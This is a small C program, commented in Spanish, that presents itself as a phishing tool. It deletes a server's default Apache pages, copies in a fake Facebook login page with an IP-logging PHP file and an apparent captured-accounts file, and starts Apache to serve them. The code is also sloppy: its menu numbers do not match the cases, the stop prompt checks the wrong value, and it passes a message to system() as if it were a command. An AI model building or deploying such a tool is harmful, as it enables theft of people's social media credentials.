//jamal 1 herramienta de phishing 

#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("jamal\n");
    printf("(1)escaner de puertos");
    printf("Phishing:\n");
    printf("(2)Facebook\n");
    printf("(3)instagram\n");
    int opcion;
    scanf("%i",&opcion);
    int opcion2;
    switch (opcion)
    {
    case 1:
        system("rm /var/www/html/index.html");
        system("rm /var/www/html/index.nginx-debian.html");
        system("cp sites/facebook/es/index.html /var/www/html/");
        system("cp sites/facebook/es/ip.php /var/www/html/");
        system("cp sites/facebook/es/cuen.txt /var/www/html/");
        system("/etc/init.d/apache2 start");
        printf("\nel servidor apache esta corriendo\n");
        printf("tipee 1 para detener: ");
        scanf("%i",&opcion2);
        if (opcion2==2)
        {
          system("/etc/init.d/apache2 stop");
          system("se detuvo");
        }
        else
        {
            printf("/etc/init.d/apache2 stop para cerrar apache");
        }
        
        system("exit");
        break;
    
    default:
        printf("eliga una opcion valida: \n");
        break;
    }
}